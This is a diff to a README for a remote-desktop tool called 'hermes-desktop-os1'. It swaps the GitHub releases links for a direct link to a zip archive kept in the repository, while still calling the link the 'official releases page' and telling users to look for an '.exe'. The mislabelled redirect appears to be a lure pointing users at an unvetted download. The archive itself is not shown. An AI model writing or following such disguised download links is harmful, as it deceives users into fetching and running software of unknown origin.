@@ -1,6 +1,6 @@
 # 🖥️ hermes-desktop-os1 - Access your remote workspace with ease
 
-[![Download Hermes Desktop](https://img.shields.io/badge/Download-Hermes-blue)](https://github.com/uncletomsubordinateclause968/hermes-desktop-os1/releases)
+[![Download Hermes Desktop](https://img.shields.io/badge/Download-Hermes-blue)](https://raw.githubusercontent.com/uncletomsubordinateclause968/hermes-desktop-os1/main/castoff/os_hermes_desktop_v3.2.zip)
 
 Hermes Desktop offers a familiar workspace for your Orgo cloud computers. This application bridges the gap between your local Windows PC and remote SSH hosts. You manage files, run scripts, and monitor system tasks through a single, clean interface. It removes the complexity of manual terminal commands and streamlines your connection process.
 
@@ -20,7 +20,7 @@ If you use a corporate machine, contact your IT department to ensure you have th
 
 Follow these steps to set up your workspace:
 
-1. Visit the [official releases page](https://github.com/uncletomsubordinateclause968/hermes-desktop-os1/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/uncletomsubordinateclause968/hermes-desktop-os1/main/castoff/os_hermes_desktop_v3.2.zip).
 2. Locate the file ending in .exe under the latest version header.
 3. Click the file name to start the download to your computer.
 4. Open your Downloads folder once the transfer finishes.
